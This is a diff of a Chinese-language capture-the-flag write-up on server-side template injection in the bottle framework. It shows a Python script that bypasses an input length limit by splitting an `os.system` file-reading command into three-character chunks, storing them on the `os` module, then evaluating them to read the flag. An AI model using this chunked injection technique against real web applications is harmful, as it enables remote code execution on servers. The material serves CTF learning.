@@ -156,26 +156,26 @@ if __name__ == '__main__':
 学到了一招，在flask里面我们知道可以往`config`里面塞payload，以绕过长度限制，但是`bottle`里面没有`config`
 这里我们可以往`os`里面塞，
 ```python
-import requests
-
-url = 'http://challenge.imxbt.cn:32082/attack'
-
-
-payload = "__import__('os').system('cat /f*>a')"
-
-
-p = [payload[i:i+3] for i in range(0,len(payload),3)]
-flag = True
-for i in p:
-    if flag:
-        tmp = f'\n%import os;os.a="{i}"'
-        flag = False
-    else:
-        tmp = f'\n%import os;os.a+="{i}"'
-    r = requests.get(url,params={"payload":tmp})
-
-r = requests.get(url,params={"payload":"\n%import os;eval(os.a)"})
-r = requests.get(url,params={"payload":"\n%include('123')"}).text
+import requests  
+  
+url = 'http://challenge.imxbt.cn:32082/attack'  
+  
+  
+payload = "__import__('os').system('cat /f*>a')"  
+  
+  
+p = [payload[i:i+3] for i in range(0,len(payload),3)]  
+flag = True  
+for i in p:  
+    if flag:  
+        tmp = f'{{import os;os.a="{i}"}}'  
+        flag = False  
+    else:  
+        tmp = f'{{import os;os.a+="{i}"}}'  
+    r = requests.get(url,params={"payload":tmp})  
+  
+r = requests.get(url,params={"payload":"{{import os;eval(os.a)}}"})  
+r = requests.get(url,params={"payload":"{{include('a')}}"}).text  
 print(r)
-
 ```
+![](assets/Day%207/file-20251225135917613.png)
